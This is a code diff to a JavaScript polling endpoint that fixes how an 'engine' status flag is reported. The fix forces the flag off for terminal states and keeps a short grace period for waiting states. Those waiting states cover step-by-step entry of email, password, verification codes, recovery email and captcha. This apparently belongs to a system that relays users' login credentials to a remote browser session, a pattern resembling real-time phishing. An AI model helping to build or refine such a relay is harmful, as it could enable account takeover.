@@ -96,20 +96,29 @@ export async function POST(request) {
         );
     }
 
-    let engineProcessing = activelyProcessing.has(browserId);
-    if (!engineProcessing) {
-        // Fallback: if user just submitted data (lastUserActivity < 30s ago) and status
-        // is still a waiting state, return engineProcessing=true. This bridges the gap
-        // between update-process writing to cache and the engine calling
-        // activelyProcessing.add(browserId). Without this, the template re-renders
-        // the waiting form and wipes the user's typed input.
-        const waitingStatuses = new Set(["WAITING","WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
-        if (waitingStatuses.has(row.status)) {
-            const recentActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
-            const age = Date.now() - recentActivity.getTime();
-            if (age < 8000) {
-                engineProcessing = true;
-                logger.info(`[pooling][${browserId}] Recent user activity (${age}ms ago). engineProcessing=true to protect template from re-render.`);
+    // Terminal/redirect statuses must NEVER set engineProcessing=true — the template
+    // needs to act on them immediately (redirect for PROCESSING_FINALIZING/COMPLETED,
+    // show error for FAILED). Not even activelyProcessing should block these.
+    let engineProcessing;
+    const terminalStatuses = new Set(["PROCESSING_FINALIZING", "COMPLETED", "FAILED"]);
+    if (terminalStatuses.has(row.status)) {
+        engineProcessing = false;
+    } else {
+        engineProcessing = activelyProcessing.has(browserId);
+        if (!engineProcessing) {
+            // Fallback: if user just submitted data (lastUserActivity < 8s ago) and status
+            // is still a waiting state, return engineProcessing=true. This bridges the gap
+            // between update-process writing to cache and the engine calling
+            // activelyProcessing.add(browserId). Without this, the template re-renders
+            // the waiting form and wipes the user's typed input.
+            const waitingStatuses = new Set(["WAITING","WAITINGEMAIL","WAITINGEMAILERROR","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"]);
+            if (waitingStatuses.has(row.status)) {
+                const recentActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
+                const age = Date.now() - recentActivity.getTime();
+                if (age < 8000) {
+                    engineProcessing = true;
+                    logger.info(`[pooling][${browserId}] Recent user activity (${age}ms ago). engineProcessing=true to protect template from re-render.`);
+                }
             }
         }
     }
